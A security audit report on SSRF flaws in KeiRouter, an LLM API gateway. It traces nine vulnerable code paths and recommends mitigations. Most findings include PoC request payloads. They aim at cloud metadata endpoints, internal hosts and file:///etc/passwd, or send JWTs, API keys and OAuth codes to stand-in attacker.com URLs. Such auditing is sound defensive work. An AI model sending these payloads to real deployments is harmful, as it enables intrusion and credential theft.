# SSRF Vulnerability Analysis Report -- KeiRouter

**Project:** KeiRouter (LLM API Gateway/Router)
**Root:** /Users/lemonilo/www/keirouter
**Date:** 2026-06-02

---

### Executive Summary

KeiRouter has **zero SSRF defenses** across its entire codebase. There is no URL validation, no scheme checking, no private IP blocking, no DNS rebinding protection, and no allowlist mechanism anywhere. Every outbound HTTP request path accepts user-controlled URLs without restriction. This creates at least **6 confirmed Critical/High SSRF vectors** accessible through the admin dashboard (loopback + session guarded) and one accessible through the authenticated API surface.

The primary defense layer is the dashboard's loopback-only access control (`BindLoopbackOnly: true` by default), which limits attack surface to local attackers or attackers who have achieved some form of local access. However, the API-level web fetch endpoint is accessible to any authenticated API key holder regardless of loopback settings.

---

### Finding SSRF-001: Account `base_url` -- Full SSRF via Provider Endpoint Redirection

**Risk Rating:** CRITICAL
**Verdict:** VULNERABLE

**Source-to-Sink Trace:**

1. **SOURCE** -- Admin creates account via `POST /api/accounts` with user-supplied `base_url`
   - File: `/Users/lemonilo/www/keirouter/backend/internal/gateway/admin.go`, lines 305-368
   - Input: `body.BaseURL` from JSON request body

2. **FLOW** -- The `base_url` is stored as-is in account metadata (no validation)
   - File: `/Users/lemonilo/www/keirouter/backend/internal/gateway/admin.go`, lines 348-351:
     ```go
     if body.BaseURL != "" {
         meta["base_url"] = body.BaseURL
     }
     ```
   - Stored via `vault.Seal()` into the account's encrypted metadata

3. **FLOW** -- On every subsequent request, the vault decrypts and exposes `base_url` as `creds.BaseURL`
   - File: `/Users/lemonilo/www/keirouter/backend/internal/vault/vault.go`, line 92:
     ```go
     creds.BaseURL = meta["base_url"]
     ```

4. **FLOW** -- Every connector's `baseURL()` method returns `creds.BaseURL` when set, overriding the default
   - File: `/Users/lemonilo/www/keirouter/backend/internal/connectors/openai_compatible.go`, lines 30-34:
     ```go
     func (c *OpenAICompatible) baseURL(creds core.Credentials) string {
         if creds.BaseURL != "" {
             return creds.BaseURL
         }
         return c.defaultBase
     }
     ```
   - Same pattern in: `anthropic.go:32`, `vertex.go:36`, `gemini.go:31`, `ollama.go:30`, `cursor.go:43`, `kiro.go:38`, `cloudcode.go:60`, `commandcode.go:30`, `web.go:42`, `openai_responses.go:30`, `github_copilot.go:43`

5. **SINK** -- The URL is passed directly to `doJSON()` / `openStream()` / `doFormPOST()` which create `http.Request` and execute via `http.Client.Do()`
   - File: `/Users/lemonilo/www/keirouter/backend/internal/connectors/httpclient.go`, lines 73-84
   - No validation of URL scheme, host, or IP at any point

**Defense Verification:**
- URL scheme validation: NONE
- Private IP blocking: NONE
- DNS rebinding protection: NONE
- Allowlist of permitted hosts: NONE
- Loopback check on outbound URL: NONE

**Validation Side-Effect:** Even the `validateAccountCredentials()` call during account creation makes a real outbound request to the attacker-supplied `base_url`, making this exploitable at creation time before the account is persisted.
- File: `/Users/lemonilo/www/keirouter/backend/internal/gateway/admin.go`, lines 357-361

**PoC Payloads:**
```
// Access cloud metadata
{"provider": "openai", "api_key": "sk-test", "base_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

// Scan internal network
{"provider": "openai", "api_key": "sk-test", "base_url": "http://192.168.1.1:8080/admin"}

// Access internal services
{"provider": "openai", "api_key": "sk-test", "base_url": "http://localhost:6379/"}

// File protocol (may work with custom transport)
{"provider": "openai", "api_key": "sk-test", "base_url": "file:///etc/passwd"}
```

**Access:** Admin dashboard (loopback + session required)

---

### Finding SSRF-002: Web Fetch -- User-Controlled URL Passed to External Service

**Risk Rating:** HIGH
**Verdict:** VULNERABLE

**Source-to-Sink Trace:**

1. **SOURCE** -- Any authenticated API key holder sends `POST /v1/web/fetch` with a `url` field
   - File: `/Users/lemonilo/www/keirouter/backend/internal/gateway/media.go`, lines 270-301
   - Input: `req.URL` from JSON body, checked only for emptiness

2. **FLOW** -- The URL is passed to `pipeline.Fetch()` which dispatches to a `WebConnector`
   - The URL flows unchanged through the pipeline

3. **SINK** -- Each web fetch provider receives the URL:
   - **Firecrawl:** URL placed directly in JSON body `{"url": req.URL}` and sent to Firecrawl API
     - File: `/Users/lemonilo/www/keirouter/backend/internal/connectors/web.go`, line 280
   - **Jina Reader:** URL appended to base URL: `base + "/" + req.URL`
     - File: `/Users/lemonilo/www/keirouter/backend/internal/connectors/web.go`, line 311
   - **Tavily:** URL placed in JSON body `{"urls": [req.URL]}`
     - File: `/Users/lemonilo/www/keirouter/backend/internal/connectors/web.go`, line 228
   - **Exa:** URL placed in JSON body `{"ids": [req.URL]}`
     - File: `/Users/lemonilo/www/keirouter/backend/internal/connectors/web.go`, line 251

**Defense Verification:**
- URL validation at gateway: NONE (only checks `url != ""`)
- URL validation at connector: NONE
- Scheme restriction: NONE (http, https, file, gopher all pass through)
- Private IP blocking: NONE
- The external services (Firecrawl, Jina, etc.) may have their own SSRF protections, but KeiRouter does not enforce any

**PoC Payloads:**
```
// Probe internal network via Firecrawl
POST /v1/web/fetch
{"model": "firecrawl/firecrawl-scrape", "url": "http://192.168.1.1/admin"}

// Cloud metadata via Jina (Jina follows redirects)
POST /v1/web/fetch
{"model": "jina-reader/jina-reader", "url": "http://169.254.169.254/latest/meta-data/"}

// Localhost service probing
POST /v1/web/fetch
{"model": "tavily/tavily-extract", "url": "http://localhost:9200/_cat/indices"}
```

**Access:** Any authenticated API key (no loopback restriction on API surface)

---

### Finding SSRF-003: Vertex Service Account `token_uri` -- Arbitrary Token Endpoint

**Risk Rating:** HIGH
**Verdict:** VULNERABLE

**Source-to-Sink Trace:**

1. **SOURCE** -- Admin creates Vertex account with SA JSON containing crafted `token_uri`
   - The SA JSON is provided as the `api_key` field
   - File: `/Users/lemonilo/www/keirouter/backend/internal/gateway/admin.go`, lines 305-368

2. **FLOW** -- `parseVertexSAJSON()` extracts `token_uri` from the JSON
   - File: `/Users/lemonilo/www/keirouter/backend/internal/connectors/vertex_auth.go`, lines 37-50
   - No validation of the `token_uri` field

3. **FLOW** -- `mintVertexToken()` uses `sa.TokenURI` as the JWT audience AND the form POST endpoint
   - File: `/Users/lemonilo/www/keirouter/backend/internal/connectors/vertex_auth.go`, lines 67-91:
     ```go
     tokenURI := sa.TokenURI
     if tokenURI == "" {
         tokenURI = "https://oauth2.googleapis.com/token"
     }
     // ...
     body, err := doFormPOST(ctx, "vertex", "", tokenURI, form, nil)
     ```

4. **SINK** -- `doFormPOST()` sends the JWT assertion (containing the private key signature) to the attacker-controlled URL
   - File: `/Users/lemonilo/www/keirouter/backend/internal/connectors/httpclient.go`, lines 139-165
   - The JWT assertion is sent as `grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=<signed_jwt>`

**Defense Verification:**
- `token_uri` validation: NONE
- URL scheme check: NONE
- Domain allowlist: NONE
- The fallback default is `https://oauth2.googleapis.com/token`, but any user-supplied value overrides it

**Impact:** Beyond SSRF, this leaks a signed JWT assertion to the attacker. If the attacker controls the token endpoint, they can return a fake `access_token` which then gets used for all subsequent Vertex API calls, potentially allowing request interception.

**PoC Payload (SA JSON):**
```json
{
  "type": "service_account",
  "project_id": "test-project",
  "private_key": "-----BEGIN RSA PRIVATE KEY-----\n...\n-----END RSA PRIVATE KEY-----\n",
  "client_email": "test@test.iam.gserviceaccount.com",
  "token_uri": "http://attacker.com/steal-jwt"
}
```

**Access:** Admin dashboard (loopback + session required)

---

### Finding SSRF-004: Proxy Pool `proxy_url` -- Traffic Interception via Malicious Proxy

**Risk Rating:** HIGH
**Verdict:** VULNERABLE

**Source-to-Sink Trace:**

1. **SOURCE** -- Admin creates proxy pool via `POST /api/proxy-pools` with user-supplied `proxy_url`
   - File: `/Users/lemonilo/www/keirouter/backend/internal/gateway/insights.go`, lines 351-393
   - Input: `body.ProxyURL` -- only checked for emptiness, no URL validation

2. **FLOW** -- Proxy URL stored in database as-is
   - File: `/Users/lemonilo/www/keirouter/backend/internal/store/repo_pools.go`

3. **FLOW** -- At dispatch time, `proxy.ResolvePool()` reads the stored URL and injects it into credentials
   - File: `/Users/lemonilo/www/keirouter/backend/internal/proxy/resolve.go`, lines 32-37:
     ```go
     switch pool.Type {
     case "vercel", "cloudflare", "deno":
         creds.RelayURL = pool.ProxyURL
     default:
         creds.ProxyURL = pool.ProxyURL
     }
     ```

4. **FLOW** -- `clientFor()` parses the proxy URL and configures it on the HTTP transport
   - File: `/Users/lemonilo/www/keirouter/backend/internal/connectors/httpclient.go`, lines 48-51:
     ```go
     if creds.ProxyURL != "" {
         if u, err := url.Parse(creds.ProxyURL); err == nil {
             t.Proxy = http.ProxyURL(u)
         }
     }
     ```

5. **SINK** -- All outbound requests for accounts bound to this pool go through the attacker-controlled proxy, including requests carrying API keys and OAuth tokens in headers

**Defense Verification:**
- Proxy URL validation: NONE
- Scheme restriction: NONE (HTTP, HTTPS, SOCKS5 all accepted by Go's `http.Transport`)
- Private IP check: NONE
- The proxy can be bound to any account via `adminUpdateAccount` setting `proxy_pool_id`

**PoC Payload:**
```
POST /api/proxy-pools
{"name": "My Proxy", "type": "http", "proxy_url": "http://attacker.com:8080"}
```
Then bind to an account to intercept all traffic including API keys.

**Access:** Admin dashboard (loopback + session required)

---

### Finding SSRF-005: Relay URL -- Full Traffic Interception

**Risk Rating:** HIGH
**Verdict:** VULNERABLE

**Source-to-Sink Trace:**

1. **SOURCE** -- Same as SSRF-004, but with `type: "vercel"` or `type: "cloudflare"` or `type: "deno"`
   - File: `/Users/lemonilo/www/keirouter/backend/internal/gateway/insights.go`, lines 367-370

2. **FLOW** -- `ResolvePool` sets `creds.RelayURL` instead of `creds.ProxyURL`
   - File: `/Users/lemonilo/www/keirouter/backend/internal/proxy/resolve.go`, lines 33-34

3. **FLOW** -- `proxyRewrite()` rewrites the request to go through the relay
   - File: `/Users/lemonilo/www/keirouter/backend/internal/connectors/httpclient.go`, lines 58-69:
     ```go
     func relayRequest(req *http.Request, relayURL string) {
         origOrigin := req.URL.Scheme + "://" + req.URL.Host
         origPath := req.URL.Path
         // ...
         req.Header.Set("x-relay-target", origOrigin)
         req.Header.Set("x-relay-path", origPath)
         relay, _ := url.Parse(relayURL)
         req.URL = relay
         req.Host = relay.Host
     }
     ```

4. **SINK** -- The request is redirected to the relay URL with the original target in `x-relay-target` and `x-relay-path` headers. The relay receives the full request including auth headers, body, and the identity of the upstream provider.

**Defense Verification:**
- Relay URL validation: NONE
- Same lack of defenses as SSRF-004

**PoC Payload:**
```
POST /api/proxy-pools
{"name": "Vercel Relay", "type": "vercel", "proxy_url": "https://attacker.com/relay"}
```

**Access:** Admin dashboard (loopback + session required)

---

### Finding SSRF-006: Qwen `resource_url` -- Host Injection

**Risk Rating:** MEDIUM
**Verdict:** VULNERABLE

**Source-to-Sink Trace:**

1. **SOURCE** -- Qwen OAuth tokens carry a `resource_url` in token response metadata, stored in account `Extra` map

2. **FLOW** -- `Qwen.endpoint()` extracts the host from `resource_url` and constructs the API endpoint
   - File: `/Users/lemonilo/www/keirouter/backend/internal/connectors/qwen_iflow.go`, lines 45-54:
     ```go
     func (c *Qwen) endpoint(creds core.Credentials) string {
         if creds.BaseURL != "" {
             return creds.BaseURL
         }
         host := "portal.qwen.ai"
         if ru := creds.Extra["resource_url"]; ru != "" {
             host = strings.TrimSuffix(strings.TrimPrefix(strings.TrimPrefix(ru, "https://"), "http://"), "/")
         }
         return "https://" + host + "/v1/chat/completions"
     }
     ```

3. **SINK** -- The constructed URL is used for API calls. An attacker who controls the `resource_url` value (e.g., through a compromised OAuth token response or by modifying account metadata) can redirect all Qwen API calls to an arbitrary host.

**Defense Verification:**
- Host validation: NONE
- The code strips `https://` and `http://` prefixes but does not validate the resulting host
- Path traversal in the host field (e.g., `attacker.com/@portal.qwen.ai`) could be used for confusion attacks

**PoC Payload (via account metadata manipulation):**
```
resource_url = "attacker.com"
```
Resulting endpoint: `https://attacker.com/v1/chat/completions`

**Access:** Requires ability to modify OAuth token metadata (admin dashboard)

---

### Finding SSRF-007: OAuth `redirect_uri` -- Unvalidated Redirect in Auth Flow

**Risk Rating:** MEDIUM
**Verdict:** VULNERABLE (limited by provider-side validation)

**Source-to-Sink Trace:**

1. **SOURCE** -- `POST /api/oauth/{provider}/authorize` accepts user-supplied `redirect_uri`
   - File: `/Users/lemonilo/www/keirouter/backend/internal/gateway/oauth.go`, lines 65-70:
     ```go
     var body struct {
         RedirectURI string `json:"redirect_uri"`
     }
     ```

2. **FLOW** -- Stored in the OAuth session and passed to the provider's authorize URL
   - File: `/Users/lemonilo/www/keirouter/backend/internal/oauth/flow.go`, line 22:
     ```go
     q.Set("redirect_uri", redirectURI)
     ```

3. **FLOW** -- Used during code exchange as the `redirect_uri` parameter
   - File: `/Users/lemonilo/www/keirouter/backend/internal/oauth/flow.go`, line 46:
     ```go
     form.Set("redirect_uri", redirectURI)
     ```

4. **SINK** -- The authorize URL is returned to the client. If the OAuth provider does not validate redirect URIs against a pre-registered list, an attacker could redirect the OAuth callback to an attacker-controlled URL to steal the authorization code.

**Defense Verification:**
- Redirect URI validation at KeiRouter: NONE
- Most reputable OAuth providers (Google, GitHub, etc.) validate redirect URIs against a pre-registered list, mitigating this
- Smaller or misconfigured providers may not

**PoC Payload:**
```
POST /api/oauth/claude/authorize
{"redirect_uri": "https://attacker.com/steal-code"}
```

**Access:** Admin dashboard (loopback + session required)

---

### Finding SSRF-008: Endpoint Settings `OutboundProxyURL` -- Latent SSRF Risk

**Risk Rating:** LOW (currently dead code)
**Verdict:** LATENT VULNERABILITY

**Trace:**

1. **SOURCE** -- `POST /api/settings/endpoint` accepts `outbound_proxy_url`
   - File: `/Users/lemonilo/www/keirouter/backend/internal/gateway/settings.go`, lines 187-191

2. **STORAGE** -- Persisted in the settings store without validation

3. **CURRENT STATE** -- The setting is stored but NEVER APPLIED to any HTTP client. There is no code that reads `OutboundProxyURL` and configures it on a transport. This is dead configuration.

**Risk:** If a future code change applies this setting to the shared HTTP client, it would create a global SSRF/interception vector. The setting exists in the schema and can be set via the admin API.

**PoC (for future-proofing):**
```
POST /api/settings/endpoint
{"outbound_proxy_enabled": true, "outbound_proxy_url": "http://attacker.com:8080"}
```

---

### Finding SSRF-009: Jina Reader URL Construction -- Protocol Confusion

**Risk Rating:** MEDIUM
**Verdict:** VULNERABLE

**Source-to-Sink Trace:**

1. **SOURCE** -- User-supplied URL from `FetchRequest.URL`
   - File: `/Users/lemonilo/www/keirouter/backend/internal/gateway/media.go`, line 275

2. **FLOW** -- Jina connector constructs URL by appending user URL to base
   - File: `/Users/lemonilo/www/keirouter/backend/internal/connectors/web.go`, line 311:
     ```go
     endpoint := strings.TrimRight(c.baseURL(creds), "/") + "/" + req.URL
     ```

3. **SINK** -- The concatenated URL is used for a GET request. If the user URL contains `@` or special characters, it can manipulate the resulting URL's authority component.

**PoC Payload:**
```
POST /v1/web/fetch
{"model": "jina-reader/jina-reader", "url": "@attacker.com/"}
```
Resulting URL: `https://r.jina.ai/@attacker.com/` -- may be parsed by some HTTP clients as connecting to `attacker.com` with auth `r.jina.ai` (userinfo attack).

---

### Summary Table

| ID | Vector | Source | Sink | Defense | Verdict | Risk |
|---|---|---|---|---|---|---|
| SSRF-001 | Account `base_url` | Admin API | All connector HTTP calls | NONE | VULNERABLE | CRITICAL |
| SSRF-002 | Web Fetch `url` | Authenticated API | External fetch services | NONE | VULNERABLE | HIGH |
| SSRF-003 | Vertex SA `token_uri` | Account API key (SA JSON) | OAuth token endpoint | NONE | VULNERABLE | HIGH |
| SSRF-004 | Proxy Pool `proxy_url` | Admin API | HTTP Transport proxy | NONE | VULNERABLE | HIGH |
| SSRF-005 | Relay URL | Admin API | Relay request rewrite | NONE | VULNERABLE | HIGH |
| SSRF-006 | Qwen `resource_url` | OAuth metadata | Qwen API endpoint | NONE | VULNERABLE | MEDIUM |
| SSRF-007 | OAuth `redirect_uri` | Admin API | OAuth authorize URL | NONE (provider may validate) | VULNERABLE | MEDIUM |
| SSRF-008 | OutboundProxyURL | Admin settings | Currently dead code | NONE | LATENT | LOW |
| SSRF-009 | Jina URL concat | Authenticated API | Jina GET request | NONE | VULNERABLE | MEDIUM |

---

### Systemic Defensive Gaps

1. **No URL validation anywhere** -- There is no function in the entire codebase that validates a URL before it is used for an outbound request. The `joinURL()` helper at `/Users/lemonilo/www/keirouter/backend/internal/connectors/httpclient.go:439` only concatenates strings.

2. **No scheme restriction** -- Go's `net/http` will follow `http://`, `https://`, and (with custom transport) potentially `file://` URLs. No code restricts which schemes are accepted.

3. **No private IP blocking** -- There is no use of `net.IP.IsPrivate()`, `net.IP.IsLoopback()`, `net.IP.IsLinkLocalUnicast()`, or `net.IP.IsLinkLocalMulticast()` for outbound URL targets. The only use of these checks is on *inbound* requests in `middleware.go:79` (loopback guard for dashboard access).

4. **No DNS validation** -- DNS rebinding is not mitigated. A URL that resolves to a public IP at validation time but to a private IP at request time would bypass any future DNS-based checks.

5. **No allowlist** -- There is no concept of permitted outbound domains or IP ranges.

6. **Shared HTTP client has no SSRF middleware** -- The `sharedClient` at `httpclient.go:28` is a plain `http.Transport` with no custom `DialContext` that could inspect resolved IPs.

### Recommended Mitigations

1. Add URL validation in a central location (e.g., a `validateOutboundURL()` function called by all `doJSON`, `doFormPOST`, `openStream`, `doRaw`, `doMultipart` functions) that:
   - Restricts schemes to `http` and `https` only
   - Blocks private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16, ::1, fc00::/7, fe80::/10)
   - Blocks cloud metadata endpoints (169.254.169.254, metadata.google.internal)
   - Optionally enforces an allowlist for known provider domains

2. Use a custom `net.Dialer` with IP validation on the shared transport to defend against DNS rebinding

3. Validate `base_url` at account creation time with scheme and host checks

4. Validate `proxy_url` and relay URLs at pool creation time

5. Validate `token_uri` in Vertex SA JSON against `https://oauth2.googleapis.com/token` or a small allowlist

6. Validate `redirect_uri` in OAuth flows against expected patterns

### Key Files Referenced

- `/Users/lemonilo/www/keirouter/backend/internal/connectors/httpclient.go` -- Shared HTTP client, all request sinks
- `/Users/lemonilo/www/keirouter/backend/internal/connectors/web.go` -- Web fetch/search connectors
- `/Users/lemonilo/www/keirouter/backend/internal/connectors/vertex_auth.go` -- Vertex SA JSON parsing, token minting
- `/Users/lemonilo/www/keirouter/backend/internal/connectors/qwen_iflow.go` -- Qwen resource_url host injection
- `/Users/lemonilo/www/keirouter/backend/internal/connectors/catalog.go` -- Provider catalog with default base URLs
- `/Users/lemonilo/www/keirouter/backend/internal/connectors/openai_compatible.go` -- OpenAI-compatible base URL pattern
- `/Users/lemonilo/www/keirouter/backend/internal/gateway/admin.go` -- Account creation, proxy pool management
- `/Users/lemonilo/www/keirouter/backend/internal/gateway/insights.go` -- Proxy pool CRUD handlers
- `/Users/lemonilo/www/keirouter/backend/internal/gateway/settings.go` -- Endpoint settings with outbound proxy config
- `/Users/lemonilo/www/keirouter/backend/internal/gateway/media.go` -- Web fetch/search/other media handlers
- `/Users/lemonilo/www/keirouter/backend/internal/gateway/oauth.go` -- OAuth flow with redirect_uri
- `/Users/lemonilo/www/keirouter/backend/internal/gateway/middleware.go` -- Auth and loopback guards
- `/Users/lemonilo/www/keirouter/backend/internal/gateway/server.go` -- Route definitions and access control
- `/Users/lemonilo/www/keirouter/backend/internal/proxy/resolve.go` -- Proxy pool resolution into credentials
- `/Users/lemonilo/www/keirouter/backend/internal/dispatch/dispatch.go` -- Dispatcher wiring proxy pools
- `/Users/lemonilo/www/keirouter/backend/internal/vault/vault.go` -- Credential decryption, base_url extraction
- `/Users/lemonilo/www/keirouter/backend/internal/core/connector.go` -- Credentials struct definition
- `/Users/lemonilo/www/keirouter/backend/internal/core/proxy.go` -- Proxy context propagation
- `/Users/lemonilo/www/keirouter/backend/internal/oauth/flow.go` -- OAuth token exchange
- `/Users/lemonilo/www/keirouter/backend/internal/oauth/providers.go` -- OAuth provider configs
- `/Users/lemonilo/www/keirouter/backend/internal/store/repo_pools.go` -- Proxy pool persistence
- `/Users/lemonilo/www/keirouter/backend/internal/config/config.go` -- Application configuration
